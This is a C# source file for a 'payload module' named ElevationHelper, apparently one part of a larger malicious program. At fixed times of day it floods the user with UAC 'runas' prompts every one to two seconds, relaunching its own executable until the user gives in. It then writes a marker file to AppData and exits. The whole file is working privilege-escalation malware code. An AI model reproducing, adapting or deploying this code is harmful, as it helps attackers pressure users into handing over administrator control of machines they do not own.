using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace zort
{
    public class ElevationHelper : IPayloadModule
    {
        public const string ELEVATION_FILE_NAME = "02D873SF743.DAT";
        private readonly Thread _elevThread = new Thread(TimedElevate);

        public ElevationType ElevationType => ElevationType.NonElevated;
        public string ModuleName => "ElevationHelper";
        public string ModuleDescription => "Spam elevates privileges at scheduled times.";
        public void Start()
        {
            _elevThread.IsBackground = true;
            _elevThread.Start();
        }

        public void Stop()
        {
            if (_elevThread.IsAlive)
            {
                _elevThread.Abort();
            }
        }

        public static bool IsElevated()
        {
            var adminGroup = new System.Security.Principal.SecurityIdentifier(
                System.Security.Principal.WellKnownSidType.BuiltinAdministratorsSid, null);
            var principal = new System.Security.Principal.WindowsPrincipal(
                System.Security.Principal.WindowsIdentity.GetCurrent());
            return principal.IsInRole(adminGroup);
        }

        public static string GetElevationFilePath()
        {
            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ELEVATION_FILE_NAME);
        }

        public static bool TryElevate()
        {
            try
            {

                //TODO: this holds the thread until the UAC prompt is closed. use a helper cmd for the UAC Prompt.
                var startInfo = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    Verb = "runas",
                    FileName = "cmd.exe",
                    Arguments = $"/c start \"\" \"{Assembly.GetExecutingAssembly().Location}\""
                };
                Process.Start(startInfo);
            }
            catch (Win32Exception ex) when (ex.NativeErrorCode == 1223)
            {
                // User canceled the UAC prompt
                return false;
            }
            catch (Exception ex)
            {
                ModuleLogger.Log(typeof(ElevationHelper), $"Error elevating process: {ex.Message}");
                return false;
            }

            return true;
        }

        public static void TimedElevate()
        {
            const bool DEBUG_DONT_WAIT = !true;
            if (DEBUG_DONT_WAIT)
            {
                ModuleLogger.Log(typeof(ElevationHelper), "DEBUG: Skipping timed elevation.");

                var didElevate = false;

                while (!didElevate)
                {
                    didElevate = TryElevate();
                    Thread.Sleep(1500);
                }
            }
            else
            {
                var now = DateTime.Now;
                var timesToElevate = new List<TimeSpan>
                    {
                        new TimeSpan(8, 25, 0),
                        new TimeSpan(9, 15, 0),
                        new TimeSpan(10, 5, 0),
                        new TimeSpan(10, 55, 0),
                        new TimeSpan(11, 45, 0),
                        new TimeSpan(12, 35, 0),
                        new TimeSpan(13, 05, 0),
                        new TimeSpan(14, 15, 0),
                        new TimeSpan(15, 5, 0)
                    };

                var nextTime = timesToElevate.FirstOrDefault(t => t > now.TimeOfDay);
                if (nextTime == default) nextTime = timesToElevate.First();
                var waitTime = (nextTime - now.TimeOfDay).TotalMilliseconds;

                if (waitTime < 0)
                {
                    waitTime += TimeSpan.FromDays(1).TotalMilliseconds;
                }

                ModuleLogger.Log(typeof(ElevationHelper), $"Waiting for {waitTime / 1000 / 60:F2} mins until next elevation time: {nextTime}");
                Thread.Sleep((int)waitTime);

                var didElevate = false;
                var timeout = nextTime.Add(new TimeSpan(0, 5, 0));
                Random r = new Random();

                while (!didElevate && DateTime.Now.TimeOfDay <= timeout)
                {
                    didElevate = TryElevate();
                    if(!didElevate) Thread.Sleep(r.Next(1000, 2000));
                }

                if(didElevate)
                {
                    string elevationAttribPath = GetElevationFilePath();
                    File.Create(elevationAttribPath).Close();
                    Environment.Exit(0);
                } 
            }
        }
    }
}
